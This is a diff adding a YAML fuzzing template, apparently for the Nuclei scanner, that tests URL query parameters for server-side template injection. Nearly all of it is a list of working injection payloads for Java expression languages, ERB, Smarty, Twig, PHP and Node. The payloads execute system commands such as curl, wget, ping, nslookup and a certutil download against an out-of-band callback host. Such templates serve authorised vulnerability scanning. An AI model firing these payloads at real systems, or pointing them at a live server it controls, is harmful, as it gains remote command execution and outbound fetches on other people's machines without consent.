@@ -1,0 +1,59 @@
+id: reflected-ssti-ssrf
+
+info:
+  name: Reflected SSTI SSRF Based
+  author: reewardius
+  severity: critical
+  reference:
+    - https://www.pwny.cc/web-attacks/server-side-template-injection-ssti
+  tags: fuzzing-rce,fuzzing-ssti,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      ssti:
+        - '${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://{{interactsh-url}}\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}'
+        - '${request.getAttribute("c").add("ping {{interactsh-url}}")}'
+        - "${T(java.lang.Runtime).getRuntime().exec('curl {{interactsh-url}}')}"
+        - "${T(java.lang.Runtime).getRuntime().exec('wget {{interactsh-url}}')}"
+        - "${T(java.lang.Runtime).getRuntime().exec('nslookup {{interactsh-url}}')}"
+        - "${T(java.lang.Runtime).getRuntime().exec('ping {{interactsh-url}}')}"
+        - ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping {{interactsh-url}}\\\")"))}
+        - '@import (inline) "http://{{interactsh-url}}";'
+        - '<%= `curl {{interactsh-url}}` %>'
+        - "<%= system('curl {{interactsh-url}}') %>"
+        - '<%= `ping {{interactsh-url}}` %>'
+        - "<%= system('ping {{interactsh-url}}') %>"
+        - '<%= `wget {{interactsh-url}}` %>'
+        - "<%= system('wget {{interactsh-url}}') %>"
+        - 'body {color: `global.process.mainModule.require("child_process").execSync("curl {{interactsh-url}}")`;}'
+        - '{php}echo `curl {{interactsh-url}}`;{/php}'
+        - "{system('curl {{interactsh-url}}')}"
+        - 'body {color: `global.process.mainModule.require("child_process").execSync("wget {{interactsh-url}}")`;}'
+        - '{php}echo `wget {{interactsh-url}}`;{/php}'
+        - "{system('wget {{interactsh-url}}')}"
+        - "{{['wget {{interactsh-url}}']|filter('system')}}"
+        - "{{['curl {{interactsh-url}}']|filter('system')}}"
+        - "{{['nslookup {{interactsh-url}}']|filter('system')}}"
+        - ';a=a/__${T (java.lang.Runtime).getRuntime().exec("certutil -urlcache -split -f http://{{interactsh-url}}")}__::.x/'
+        - 'a=a/__${T (java.lang.Runtime).getRuntime().exec("certutil -urlcache -split -f http://{{interactsh-url}}")}__::.x/'
+        - '__${T (java.lang.Runtime).getRuntime().exec("certutil -urlcache -split -f http://{{interactsh-url}}")}__::.x/'
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{ssti}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
